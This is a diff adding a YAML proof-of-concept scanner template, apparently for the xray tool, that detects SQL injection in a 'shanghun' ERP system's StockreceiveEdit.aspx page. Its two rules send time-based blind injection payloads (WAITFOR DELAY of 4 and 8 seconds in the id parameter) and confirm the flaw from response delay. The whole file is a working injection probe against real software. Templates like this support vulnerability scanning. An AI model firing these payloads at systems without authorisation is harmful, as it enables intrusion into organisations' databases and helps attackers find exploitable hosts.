@@ -1,0 +1,25 @@
+name: poc-yaml-shanghunERP-StockreceiveEdit.aspx-sql
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:4%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /ERP/StockreceiveEdit.aspx?id=1;WAITFOR%20DELAY%20%270:0:8%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487565&idx=1&sn=8d8079c0446470bcb1f32d89872f6110&chksm=c267a57ef5102c6883feac8b1f870a56b0a06997881367ecd3dc0eb18871aee558fd58b268c2&token=1439003696&lang=zh_CN#rd
